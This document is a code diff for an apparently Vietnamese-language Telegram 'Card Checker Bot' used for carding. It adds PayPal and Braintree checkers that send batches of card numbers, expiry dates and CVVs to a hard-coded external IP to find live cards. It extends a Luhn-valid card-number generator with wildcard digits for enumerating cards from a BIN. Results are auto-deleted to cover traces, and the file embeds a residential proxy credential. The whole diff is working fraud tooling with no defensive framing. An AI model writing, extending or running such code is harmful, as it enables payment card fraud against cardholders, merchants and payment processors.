@@ -18,7 +18,7 @@ DEFAULT_SITE = "https://shelf-co.com"
 DEFAULT_PROXY = "geo.g-w.info:10080:user-P9tQgwy5zruWwzMa-type-residential-session-kxy6by9h-country-UK-rotation-15:3RpmDKUKGSdqJFJu"
 API_ENDPOINT = "http://152.42.163.248/shopify.php"
 
-# Auto-delete delay in seconds (120 = 1 minute and 30 second)
+# Auto-delete delay in seconds (120 = 2 minutes)
 AUTO_DELETE_DELAY = 120
 
 # Admin user IDs - these users can manage other users' settings
@@ -289,14 +289,23 @@ def handle_start(chat_id, user_msg_id):
         "🔥 <b>Card Checker Bot</b>\n"
         "━━━━━━━━━━━━━━━━━━━━━━\n\n"
 
-        "💳 <b>CHECK CARDS</b>\n"
+        "💳 <b>CHECK CARDS (Shopify)</b>\n"
         "<code>/chg 4111111111111111|03|2026|123</code>\n"
         "<code>/chg</code>  <i>(nhiều thẻ, mỗi dòng 1 thẻ)</i>\n\n"
+
+        "🅿️ <b>CHECK PAYPAL</b>\n"
+        "<code>/pp 4117740076639353|09|2029|128</code>\n"
+        "<code>/pp</code>  <i>(nhiều thẻ, tối đa 20)</i>\n\n"
+
+        "🌿 <b>CHECK BRAINTREE</b>\n"
+        "<code>/b3 4117740076639353|09|2029|128</code>\n"
+        "<code>/b3</code>  <i>(nhiều thẻ, tối đa 20)</i>\n\n"
 
         "🎲 <b>GENERATE CARDS</b>\n"
         "<code>/gen 414170</code>  — 10 thẻ ngẫu nhiên\n"
         "<code>/gen 414170 20</code>  — 20 thẻ\n"
-        "<code>/gen 414170|03|2026</code>  — cố định exp\n\n"
+        "<code>/gen 414170|03|2026</code>  — cố định exp\n"
+        "<code>/gen 4147xxxxxxxx</code>  — x = số ngẫu nhiên\n\n"
 
         "⚙️ <b>SETTINGS</b>\n"
         "<code>/settings</code>  — Xem cài đặt hiện tại\n"
@@ -324,7 +333,7 @@ def handle_start(chat_id, user_msg_id):
 
         "━━━━━━━━━━━━━━━━━━━━━━\n"
         "📌 Format: <code>số_thẻ|mm|yyyy|cvv</code>\n"
-        "🗑️ Kết quả tự xóa sau 1 phút"
+        "🗑️ Kết quả tự xóa sau 2 phút"
     )
     msg_id = send_message(chat_id, text)
     # Auto-delete both user command and bot reply
@@ -685,9 +694,26 @@ def luhn_checksum(card_number):
     return total % 10
 
 def generate_card_number(bin_prefix, length=16):
-    """Generate a valid card number from BIN using Luhn algorithm"""
+    """Generate a valid card number from BIN using Luhn algorithm.
+    
+    bin_prefix may contain 'x' or 'X' as wildcard digits (random 0-9).
+    The prefix can be any length from 1 to (length-1) digits.
+    If prefix is already (length-1) digits, only the Luhn check digit is appended.
+    If prefix is >= length digits, it is truncated to (length-1) and check digit recalculated.
+    """
+    # Replace x/X wildcards with random digits
+    card = ""
+    for ch in str(bin_prefix):
+        if ch.lower() == 'x':
+            card += str(random.randint(0, 9))
+        else:
+            card += ch
+    
+    # If prefix is already full length, recalculate last digit as Luhn check
+    if len(card) >= length:
+        card = card[:length - 1]
+    
     # Fill remaining digits randomly (except last check digit)
-    card = str(bin_prefix)
     while len(card) < length - 1:
         card += str(random.randint(0, 9))
     
@@ -720,8 +746,21 @@ def detect_card_brand(bin_prefix):
     else:
         return "UNKNOWN"
 
+def resolve_wildcards(value):
+    """Replace x/X in a string with random digits 0-9"""
+    result = ""
+    for ch in value:
+        if ch.lower() == 'x':
+            result += str(random.randint(0, 9))
+        else:
+            result += ch
+    return result
+
 def generate_cards(bin_prefix, count=10, month=None, year=None, cvv=None):
-    """Generate cards from BIN prefix"""
+    """Generate cards from BIN prefix.
+    
+    month/year/cvv may contain 'x'/'X' as wildcard digits.
+    """
     brand = detect_card_brand(bin_prefix)
     
     # Card length based on brand
@@ -736,20 +775,27 @@ def generate_cards(bin_prefix, count=10, month=None, year=None, cvv=None):
     for _ in range(count):
         card_num = generate_card_number(bin_prefix, card_length)
         
-        # Random expiry if not specified
+        # Random expiry if not specified (or resolve wildcards)
         if month:
-            m = month
+            m = resolve_wildcards(month)
+            # Ensure valid month after wildcard resolution
+            try:
+                m_int = int(m)
+                if m_int < 1 or m_int > 12:
+                    m = str(random.randint(1, 12)).zfill(2)
+            except ValueError:
+                m = str(random.randint(1, 12)).zfill(2)
         else:
             m = str(random.randint(1, 12)).zfill(2)
         
         if year:
-            y = year
+            y = resolve_wildcards(year)
         else:
             y = str(random.randint(2025, 2031))
         
-        # Random CVV if not specified
+        # Random CVV if not specified (or resolve wildcards)
         if cvv:
-            c = cvv
+            c = resolve_wildcards(cvv)
         else:
             c = ''.join([str(random.randint(0, 9)) for _ in range(cvv_length)])
         
@@ -765,6 +811,8 @@ def handle_gen(chat_id, text, user_msg_id):
         /gen 414170 20       -> gen 20 cards
         /gen 414170|03|2026  -> gen with specific month/year
         /gen 414170|03|2026|699 -> gen with specific month/year/cvv
+        /gen 4147xxxxxxxx    -> x = random digit wildcard
+        /gen 4147xxxxxxxx|03|2026|xxx -> wildcards in any field
     """
     msg_ids_to_delete = [user_msg_id]
     
@@ -776,6 +824,9 @@ def handle_gen(chat_id, text, user_msg_id):
             "<code>/gen 414170 20</code> — Gen 20 cards\n"
             "<code>/gen 414170|03|2026</code> — With exp\n"
             "<code>/gen 414170|03|2026|699</code> — With exp+cvv\n"
+            "<code>/gen 41177400766393</code> — nhiều số hơn, tự gen phần còn lại\n"
+            "<code>/gen 4147xxxxxxxx</code> — x = số ngẫu nhiên\n"
+            "<code>/gen 4147xxxxxxxx|xx|202x|xxx</code> — wildcards\n"
         )
         msg_ids_to_delete.append(msg_id)
         schedule_delete_multiple(chat_id, msg_ids_to_delete)
@@ -800,9 +851,12 @@ def handle_gen(chat_id, text, user_msg_id):
     bin_fields = bin_part.split('|')
     bin_prefix = bin_fields[0].strip()
     
-    # Validate BIN (must be 4-8 digits)
-    if not bin_prefix.isdigit() or len(bin_prefix) < 4 or len(bin_prefix) > 8:
-        msg_id = send_message(chat_id, "❌ Invalid BIN! Must be 4-8 digits.\n\nExample: <code>/gen 414170</code>")
+    # Validate BIN: at least 4 chars, only digits and x/X wildcards
+    # No upper limit — user can provide as many digits as they want;
+    # generate_card_number() will fill/truncate to the correct card length.
+    import re as _re
+    if not _re.match(r'^[0-9xX]{4,}$', bin_prefix):
+        msg_id = send_message(chat_id, "❌ Invalid BIN! Must be at least 4 digits (use x for random positions).\n\nExample: <code>/gen 414170</code> or <code>/gen 41177400766393xx</code>")
         msg_ids_to_delete.append(msg_id)
         schedule_delete_multiple(chat_id, msg_ids_to_delete)
         return
@@ -812,10 +866,18 @@ def handle_gen(chat_id, text, user_msg_id):
     cvv = None
     
     if len(bin_fields) >= 2 and bin_fields[1].strip():
-        month = bin_fields[1].strip().zfill(2)
+        raw_month = bin_fields[1].strip()
+        # Allow wildcards (x/X) in month; only zfill if no wildcards
+        if 'x' in raw_month.lower():
+            month = raw_month.lower().zfill(2)
+        else:
+            month = raw_month.zfill(2)
     if len(bin_fields) >= 3 and bin_fields[2].strip():
         y = bin_fields[2].strip()
-        year = "20" + y if len(y) == 2 else y
+        if 'x' not in y.lower() and len(y) == 2:
+            year = "20" + y
+        else:
+            year = y
     if len(bin_fields) >= 4 and bin_fields[3].strip():
         cvv = bin_fields[3].strip()
     
@@ -862,6 +924,179 @@ def handle_gen(chat_id, text, user_msg_id):
         msg_ids_to_delete.append(msg_id)
     
     schedule_delete_multiple(chat_id, msg_ids_to_delete)
+
+# ==================== PAYPAL / BRAINTREE CHECK ====================
+
+PP_API = "http://152.42.163.248/pp.php?card="
+B3_API = "http://152.42.163.248/b3.php?card="
+
+def extract_cards_from_text(text, max_cards=20):
+    """Extract card strings in format number|mm|yyyy|cvv from any text.
+    Returns list of matched card strings (up to max_cards).
+    """
+    import re
+    pattern = r'\d{13,19}\s*\|\s*\d{1,2}\s*\|\s*\d{2,4}\s*\|\s*\d{3,4}'
+    matches = re.findall(pattern, text)
+    # Normalize whitespace around pipes
+    result = []
+    for m in matches[:max_cards]:
+        parts = [p.strip() for p in m.split('|')]
+        # Normalize month and year
+        num = parts[0]
+        mon = parts[1].zfill(2)
+        yr = parts[2] if len(parts[2]) == 4 else "20" + parts[2]
+        cvv = parts[3]
+        result.append(f"{num}|{mon}|{yr}|{cvv}")
+    return result
+
+def check_card_gateway(card_format, api_url):
+    """Call a gateway API (pp or b3) and return raw response text"""
+    url = api_url + card_format
+    try:
+        response = requests.get(url, timeout=60)
+        return response.text.strip()
+    except requests.exceptions.Timeout:
+        return "TIMEOUT"
+    except requests.exceptions.RequestException as e:
+        return f"CONNECTION_ERROR: {str(e)[:80]}"
+
+def handle_gateway_check(chat_id, user_id, text, user_name, user_msg_id, gateway):
+    """Generic handler for /pp and /b3 commands.
+    
+    gateway: 'pp' or 'b3'
+    """
+    msg_ids_to_delete = [user_msg_id]
+    
+    if gateway == 'pp':
+        api_url = PP_API
+        gate_name = "PayPal"
+        gate_emoji = "🅿️"
+    else:
+        api_url = B3_API
+        gate_name = "Braintree"
+        gate_emoji = "🌿"
+    
+    # Extract cards from the entire message text (skip the command itself)
+    # Remove the command prefix to search the rest
+    parts = text.split(maxsplit=1)
+    search_text = parts[1] if len(parts) > 1 else ""
+    
+    cards = extract_cards_from_text(search_text, max_cards=20)
+    
+    if not cards:
+        msg_id = send_message(chat_id,
+            f"❌ No valid cards found!\n\n"
+            f"📋 Usage: <code>/{gateway} card|mm|yyyy|cvv</code>\n\n"
+            f"Example:\n"
+            f"<code>/{gateway} 4117740076639353|09|2029|128</code>\n\n"
+            f"Or multiple cards (max 20):\n"
+            f"<code>/{gateway}\n"
+            f"4117740076639353|09|2029|128\n"
+            f"5426340331431119|11|2026|079</code>"
+        )
+        msg_ids_to_delete.append(msg_id)
+        schedule_delete_multiple(chat_id, msg_ids_to_delete)
+        return
+    
+    total = len(cards)
+    status_text = (
+        f"{gate_emoji} <b>{gate_name} Checker</b>\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"👤 User: {user_name}\n"
+        f"📋 Cards: {total}\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
+        f"⏳ Processing..."
+    )
+    status_msg_id = send_message(chat_id, status_text)
+    msg_ids_to_delete.append(status_msg_id)
+    
+    results_text = []
+    live_count = 0
+    die_count = 0
+    start_time = time.time()
+    
+    for i, card_format in enumerate(cards, 1):
+        raw = check_card_gateway(card_format, api_url)
+        
+        # Determine result emoji based on response keywords
+        raw_upper = raw.upper()
+        if any(k in raw_upper for k in ["APPROVED", "SUCCESS", "CHARGED", "LIVE", "CVV", "INSUFFICIENT"]):
+            emoji = "✅"
+            live_count += 1
+        elif any(k in raw_upper for k in ["DECLINED", "INVALID", "STOLEN", "LOST", "BLOCKED", "EXPIRED", "ERROR", "TIMEOUT", "FAIL"]):
+            emoji = "❌"
+            die_count += 1
+        else:
+            emoji = "⚠️"
+            die_count += 1
+        
+        # Truncate long responses
+        display_raw = raw[:120] + "..." if len(raw) > 120 else raw
+        result_line = f"{emoji} <code>{card_format}</code>\n   ↳ {display_raw}"
+        results_text.append(result_line)
+        
+        # Update status every card (or every 3 for large batches)
+        update_interval = 1 if total <= 10 else 3
+        if status_msg_id and (i % update_interval == 0 or i == total):
+            elapsed = int(time.time() - start_time)
+            progress_text = (
+                f"{gate_emoji} <b>{gate_name} Checker</b>\n"
+                f"━━━━━━━━━━━━━━━━━━━━━━\n"
+                f"👤 User: {user_name}\n"
+                f"📊 Progress: {i}/{total} | ✅ {live_count} | ❌ {die_count}\n"
+                f"⏱️ Elapsed: {elapsed}s\n"
+                f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
+            )
+            progress_text += "\n\n".join(results_text[-5:])
+            if i < total:
+                progress_text += f"\n\n⏳ Checking next..."
+            edit_message(chat_id, status_msg_id, progress_text)
+        
+        if i < total:
+            time.sleep(2)
+    
+    # Final result
+    elapsed = int(time.time() - start_time)
+    mins = elapsed // 60
+    secs = elapsed % 60
+    
+    final_text = (
+        f"{gate_emoji} <b>{gate_name} — CHECK COMPLETED</b>\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"👤 User: {user_name}\n"
+        f"📋 Total: {total} | ✅ Live: {live_count} | ❌ Die: {die_count}\n"
+        f"⏱️ Time: {mins}m {secs}s\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
+    )
+    final_text += "\n\n".join(results_text)
+    final_text += f"\n\n🗑️ <i>Auto-delete in {AUTO_DELETE_DELAY}s</i>"
+    
+    if status_msg_id:
+        if len(final_text) > 4000:
+            edit_message(chat_id, status_msg_id, f"{gate_emoji} Check completed! See results below ⬇️")
+            chunk = ""
+            for line in results_text:
+                if len(chunk) + len(line) + 4 > 3500:
+                    chunk_msg_id = send_message(chat_id, chunk)
+                    msg_ids_to_delete.append(chunk_msg_id)
+                    chunk = ""
+                chunk += line + "\n\n"
+            if chunk:
+                chunk_msg_id = send_message(chat_id, chunk)
+                msg_ids_to_delete.append(chunk_msg_id)
+            summary = (
+                f"\n{gate_emoji} <b>SUMMARY</b>\n"
+                f"━━━━━━━━━━━━━━━━━━━━━━\n"
+                f"📋 Total: {total} | ✅ Live: {live_count} | ❌ Die: {die_count}\n"
+                f"⏱️ Time: {mins}m {secs}s\n"
+                f"🗑️ <i>Auto-delete in {AUTO_DELETE_DELAY}s</i>"
+            )
+            summary_msg_id = send_message(chat_id, summary)
+            msg_ids_to_delete.append(summary_msg_id)
+        else:
+            edit_message(chat_id, status_msg_id, final_text)
+    
+    schedule_delete_multiple(chat_id, msg_ids_to_delete, delay=AUTO_DELETE_DELAY)
 
 # ==================== ADMIN COMMANDS ====================
 
@@ -1351,6 +1586,10 @@ def process_message(message):
         handle_chatid(chat_id, message, user_msg_id)
     elif text_lower.startswith("/chg"):
         handle_chg(chat_id, user_id, text, user_name, user_msg_id)
+    elif text_lower.startswith("/pp"):
+        handle_gateway_check(chat_id, user_id, text, user_name, user_msg_id, 'pp')
+    elif text_lower.startswith("/b3"):
+        handle_gateway_check(chat_id, user_id, text, user_name, user_msg_id, 'b3')
     elif text_lower.startswith("/gen"):
         handle_gen(chat_id, text, user_msg_id)
     elif text_lower.startswith("/myid"):
